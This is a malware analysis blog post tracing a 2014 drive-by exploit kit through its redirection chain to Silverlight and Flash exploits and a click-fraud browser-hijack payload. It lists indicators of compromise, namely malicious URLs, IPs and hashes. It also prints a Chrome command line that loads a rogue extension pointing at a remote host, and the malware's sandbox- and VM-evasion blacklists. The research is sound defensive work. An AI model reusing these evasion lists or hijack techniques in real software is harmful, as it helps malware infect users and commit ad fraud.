@@ -1,0 +1,227 @@
+Shining some light on the ‘Unknown’ Exploit Kit
+Every now and again we come across new URL patterns when investigating traffic captures. In some cases, they are variations of existing redirectors or exploit kits which play the cat-and-mouse game with security researchers, other times they are the indication of a new threat.
+But what makes something ‘new’, and how can you be sure that it is indeed something truly novel? Unless you have tracked the drive-by / exploit kit scene from day one or been able to map it out down to the tiniest details, this is not something easy.
+There are a few reasons for this. For one, the landscape is vast and ever-changing, bringing an overwhelming amount of information that needs to be dissected and categorized.
+Secondly, much of what we see is what the bad guys are showing us, which essentially means client-side traffic.
+What about the back-end structure, the actual actors in this ecosystem?
+Thankfully we do get the chance to look at it thanks to the relentless work of dedicated researchers such as @kafeine. But sometimes, there are still some things that are left unclear or may confuse some of us (including the author of this article).
+When a security researcher stumbles upon something he does not recognize, he often calls it ‘unknown’ for the lack of information needed to give it a proper name.
+This post will dig into such a case that has been floating around for some time now and may finally get a chance to have enough exposure to be categorized.
+The ‘Unknown’ Exploit Kit
+A couple of weeks ago, we observed a new traffic pattern (new to us) that first caught our attention for a couple of reasons:
+
+The payload’s size did not match that of any URL from the capture
+The URL patterns were new
+
+Before diving into the exploit kit itself, let’s first take a look at how we got there.
+Redirection chain
+Raw traffic:
+
+Traffic highlights:
+hxxp://flyclick.biz/click?app=app8&click=c7d3c12b-1e98-4cde-b4a1-36b9e8acd624&search=7c9ec1c9-b3ac-4a88-a99f-c95bb7c07d02&feed=18418
+HTTP/1.1 302 Found
+Server: nginx
+Date: Wed, 20 Aug 2014 11:19:58 GMT
+Connection: keep-alive
+Location: http://chokoboko.com/reject/
+Content-Length: 0
+hxxp://chokoboko.com/reject/
+//document.write("http://flyclick.biz/click?app=app20&click=d4467442-220a-4890-9157-57bddb24bcbd&search=765b6198-a556-4367-9633-8adb52afcf8e&feed=18398");
+hxxp://flyclick.biz/click?app=app20&click=d4467442-220a-4890-9157-57bddb24bcbd&search=765b6198-a556-4367-9633-8adb52afcf8e&feed=18398
+HTTP/1.1 302 Found
+Server: nginx
+Date: Wed, 20 Aug 2014 11:20:01 GMT
+Connection: keep-alive
+Location: http://color-finance.com/preview.php
+Content-Length: 0
+hxxp://color-finance.com/preview.php
+<iframe width="100px" height="100" src="http://46.229.172.100/?link=beba101f-36a6-4598-71f9-0e61e3554507&pid=1356" border="0" scrolling="no">
+hxxp://46.229.172.100/?link=beba101f-36a6-4598-71f9-0e61e3554507&pid=1356
+HTTP/1.1 303 See Other
+Content-Type: text/plain
+Location: http://109.206.160.239/click.php?id=pyTaT8AKcaTIksmgJNHIS0ScSv6TIH81L5CTvXcE2_XQKhh-xjI5zlT-Ug3DP_f7lKVFHULQP0wW8juws3MOIKNAX-LVRn2iw_ejzP98UJc%2C
+Date: Wed, 20 Aug 2014 19:22:09 GMT
+Content-Length: 173
+hxxp://109.206.160.239/click.php?id=pyTaT8AKcaTIksmgJNHIS0ScSv6TIH81L5CTvXcE2_XQKhh-xjI5zlT-Ug3DP_f7lKVFHULQP0wW8juws3MOIKNAX-LVRn2iw_ejzP98UJc%2C
+HTTP/1.1 302 Moved Temporarily
+Server: nginx
+Date: Wed, 20 Aug 2014 09:15:53 GMT
+Content-Type: text/html; charset=utf-8
+Connection: keep-alive
+Set-Cookie: goal=31102%7Ccolor-finance.com%7CGBR%7Cbluelakes%7C66734%7Csanyo+troubleshooting; expires=Thu, 21-Aug-2014 11:20:38 GMT; path=/; domain=.bizzclick.com
+Location: http://www.inpoucher.com/video2014/index.php?said=do1okr03df315a
+Content-Length: 0
+hxxp://www.inpoucher.com/video2014/index.php?said=do1okr03df315a
+<i frame vspace="0" marginheight="0" marginwidth="0" hspace="0" scrolling="no" width="13" height="12" src="hxxp://www.pizzanetp.com/nhqdxa/eipm.php" frameborder="0"></I FRAME>
+This last web session leads to the unknown exploit kit’s landing page.
+Landing page:
+hxxp://www.pizzanetp.com/nhqdxa/eipm.php
+Domains on that IP address (76.74.157.161):
+
+www.sempikoa.com
+www.inpoucher.com
+www.pizzanetp.com
+www.theyfenako.com
+www.webinarster.com
+
+Here is some additional information on the IP address from VirusTotal:
+Earliest recorded event for the pizzanetp.com domain:
+
+Earlier record for two of the other domains:
+
+Link with previous research:
+
+The structure of the URL and IP matches one found earlier by @MalwareSigs on IP 72.51.47.69:
+
+Credits to @kafeine, @MalwareSigs, @malware_traffic for their hard work.
+Exploit Kit overview
+
+This exploit kit targets two different pieces of software: Microsoft Silverlight and Adobe Flash. However, unlike some other exploit kits it will only push one exploit per load giving preference to Silverlight first and then Flash.
+Attack paths
+Silverlight only:
+
+Flash only:
+
+Silverlight and Flash:
+
+All three successful paths lead to either a:
+
+Silverlight exploit
+Flash exploit
+
+Case #1: Silverlight exploit scenario
+
+Landing page
+URL: hxxp://www.pizzanetp.com/nhqdxa/eipm.php (static name)
+
+Deobfuscated highlights:
+
+Silverlight exploit
+URL: hxxp://www.pizzanetp.com/nhqdxa/vpclcy.x (static name)
+
+Version used: 5.1.10411.0
+CVE-2013-0074
+VirusTotal detection: (4/55)
+
+Here’s the Silverlight object required to fire the exploit:
+
+Here’s the call to the API (InternetOpenUrlA) used for the exploit (memory leak):
+
+After loading shellcode in memory, it can run the payload from the heap with read and write privileges:
+
+Now the DLL is invoked and the system infected (note that the dropped DLL name is randomized each time):
+
+Case #2: Flash exploit scenario
+
+Landing page
+Same as case #1.
+Flash exploit
+URL: hxxp://www.pizzanetp.com/nhqdxa/oujyt.swf (static name)
+
+Version used: 11.3.300.273
+VirusTotal detection: (7/54) and metadata:
+
+Payload
+
+Silverlight initiated payload: hxxp://www.pizzanetp.com/nhqdxa/yztl.php (static name)
+
+Hash: ba9d1976118c944bc70a200a6bfd961c75bc534ec0a7e687ad7f13db403b7280
+
+Flash initiated payload: hxxp://www.pizzanetp.com/nhqdxa/gjtzssq.php (static name)
+
+Hash: a190900ee5bfd20e0e4e79a361905c0244a526def158a7dae72a8a81cf994b46
+Both files are the same payload even if their size differs. This is due to the encoding/decoding routines specific to Silverlight and Flash.
+Evasion techniques
+The malware retrieves a list of installed services by enumerating the following registry key:
+HKLM\SYSTEM\ControlSet001\Services
+
+Blacklisted services (virtualization products):
+vmicexchange
+vmci
+vmdebug
+vmmouse
+VMTools
+VMMEMCTL
+vmware
+vmx86
+vpc-s3
+vpcuhub
+msvmmouf
+VBoxMouse
+VBoxGuest
+VBoxSF
+xenevtchn
+xennet
+xennet6
+xensvc
+xenvdb
+The malware retrieves a list of running processes by executing a WMI script (“Select * from Win32_Process“)
+
+Blacklisted processes (virtualization products, sandboxes, and analyst tools):
+
+vmware
+vmount2
+vmusrvc
+vmsrvc
+VboxService
+vboxtray
+xenservice
+joeboxserver
+joeboxcontrol
+wireshark
+sniff_hit
+sysAnalyzer
+filemon
+procexp
+procmon
+regmon
+autoruns
+The malware retrieves a list of files in the system32 (%windir%\system32) directory and looks for blacklisted files (virtualization products):
+
+xenvdb
+hgfs.sys
+vmhgfs.sys
+prleth.sys
+prlfs.sys
+prlmouse.sys
+prlvideo.sys
+prl_pv32.sys
+vpc-s3.sys
+vmsrvc.sys
+vmx86.sys
+vmnet.sys
+Payload details
+Google Chrome (version 36.0.1985) is downloaded from a remote server:
+hxxp://109.206.180.132/hfudk435k/cn.36.2?i=7BF06358932C9C6CF9DA699098A7006E&a=136&b=190963631
+
+Named “browser.exe”, the chrome exe, it creates a folder in the user’s appdata folder, named by joining two strings:
+First list:
+Game,Tool,Utility,Sysutil,Browser,Navigator,Modulator,Receiver,Calculator,Validator,UI,Provider,Teller,Narrator,Supporter,Volunteer,Vinyl,Polyester,Cotton,Whisky
+Second list:
+Visual,Optional,Jawa,Software,Assistant,Model,Gravity,Higgs,Medium,Noteworthy,Pale,Infinity,Voice,Sync,Joint,Mobile,Wireless,Radio,Humble,Beerware
+On the analysis machine, the path to Chrome was “C:\Documents and Settings\Administrator\Local Settings\Application Data\SupporterSoftware\ToolModel\browser.exe”
+The malware DLL is remotely loaded into chrome and the main thread resumes.
+
+This process is created in a suspended state, with an additional URL argument:
+"C:\Documents and Settings\Administrator\Local Settings\Application Data\SupporterSoftware\ToolModel\browser.exe" --load-extension="C:\Documents and Settings\Administrator\Local Settings\Application Data\SupporterSoftware\UtilityMedium" http://206.51.231.110/jNryH6/dERkj82cbbR2?t=41170B8939AF1570CD8993627E6CA162&o=145&y=1
+
+Here is the source code of that URL:
+<html><title>144.76.80.177|searchaccess.com|60,93,45,68|</title><script>window.setTimeout(function () { window.location="http://searchaccess.com/?search=scrabble+word+finder&JdueHdbS=http%3A%2F%2Fflyclick.biz%2Fclick%..."; }, 8000);</script></html>
+searchaccess.com displays a “not active” message:
+
+But let’s not get fooled by this. Here’s how Google indexed the server:
+
+And here is the WHOIS information which does raise some eyebrows:
+
+Additional search on the domain shows that its Name Servers used to (first seen 2013-12-30 13:40:36 -0000) resolve to:
+searchaccess.com. NS buy.internettraffic.com
+searchaccess.com. NS sell.internettraffic.com
+Correlating those NS, we can find interesting information about click fraud activity.
+If you are infected with this piece of malware, please read this removal guide from Pieter Arntz.
+Conclusions
+The payload appears to be a browser hijack whose goal is to illegally gain advertising revenue from infected computers.
+What is perhaps more puzzling is the fact that this exploit kit has been around for so long and yet has been so quiet, not to mention the fact that reproducing an infection even with the proper referers is rather difficult (IP blacklisting, geolocation, etc).
+Another big question remains: Why would the author(s) bother with such advanced fingerprinting and evasion techniques, something we don’t normally see in typical malware.
+It seems that this bit of research has brought up more questions than when we started. That is not unusual though, and at least some dots have been connected.
+With additional contributions from David Sanchez, Joshua Cannell and Steven Burn.
+@jeromesegura
